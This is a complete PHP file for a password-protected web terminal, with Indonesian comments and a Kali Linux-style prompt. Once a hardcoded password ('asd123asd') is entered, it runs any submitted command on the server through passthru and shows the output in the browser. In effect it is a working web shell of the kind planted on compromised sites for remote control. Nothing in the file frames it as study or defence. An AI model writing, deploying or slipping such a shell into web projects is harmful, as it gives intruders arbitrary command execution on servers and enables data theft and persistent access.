<?php
session_start();

$output = '';
$commandHistory = isset($_SESSION['command_history']) ? $_SESSION['command_history'] : array();
$currentDirectory = isset($_SESSION['current_directory']) ? $_SESSION['current_directory'] : getcwd();

// Fungsi untuk memeriksa apakah pengguna sudah login atau belum
function isUserLoggedIn() {
    return isset($_SESSION['user_authenticated']) && $_SESSION['user_authenticated'] === true;
}

// Fungsi untuk melakukan proses login
function loginUser($password) {
    // Ganti ini dengan password yang sesuai
    $correctPassword = 'asd123asd';

    if ($password === $correctPassword) {
        $_SESSION['user_authenticated'] = true;
        return true;
    } else {
        return false;
    }
}

// Fungsi untuk logout
function logoutUser() {
    $_SESSION['user_authenticated'] = false;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = $_POST['command'];

    if (isUserLoggedIn()) {
        if ($command === 'logout') {
            logoutUser();
            $output = 'Logout berhasil!';
        } elseif ($command === 'clear') {
            // Handle 'clear' command
            $commandHistory = array();
            $output = '';
        } else {
            // Execute the command using passthru
            ob_start();
            passthru($command, $returnValue);
            $output = ob_get_clean();

            $commandHistory[] = array('command' => $command, 'output' => $output);
            $commandHistory = array_slice($commandHistory, -10, 10);
        }
    } else {
        // Jika pengguna belum login, coba login dengan command sebagai password
        if (loginUser($command)) {
            $output = 'Login berhasil! Silakan gunakan terminal ini.';
        } else {
            $output = 'Anda belum login.';
        }
    }

    $_SESSION['command_history'] = $commandHistory;
    $_SESSION['current_directory'] = $currentDirectory;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Terminal</title>
    <style>
        body {
            font-family: monospace;
            background-color: black;
            color: white;
            margin: 0;
            padding: 10px;
            display: flex;
            flex-direction: column;
            height: 100vh;
            font-family: monospace;
            color: #0068ee;
        }
        #terminal {
            flex-grow: 1;
            overflow-y: scroll;
            border: 1px solid white;
            padding: 10px;
            margin-bottom: 10px;
            font-size: 14px;
        }

        form {
            display: flex;
            margin-bottom: 10px;
        }
        input[type="text"] {
            flex-grow: 1;
            padding: 5px;
            background-color: transparent;
            border: none;
            color: white;
            outline: none;
        }
        input[type="submit"] {
            margin-left: 10px;
            padding: 5px 10px;
            cursor: pointer;
        }
        pre {
            margin: 0;
        }
        div.command-line {
            display: flex;
        }
        div.prompt {
            color: #00ff00; /* Green color for the prompt */
            margin-right: 5px;
        }
    </style>
</head>
<body>
    <div id="terminal">
        <?php
        foreach ($commandHistory as $historyItem) {
            echo '<div class="command-line"><div class="prompt">┌──(kali㉿kali)-[~]</div><div>$</div>' . htmlspecialchars($historyItem['command']) . '</div>';
            echo '<pre>' . htmlspecialchars($historyItem['output']) . '</pre>';
        }
        ?>
        <form method="post" action="">
            <div class="command-line">
                <div class="prompt">┌──(kali㉿kali)-[~]</div>
                <div>$</div>
                <input type="text" name="command" autofocus autocomplete="off">
            </div>
        </form>
    </div>
</body>
</html>
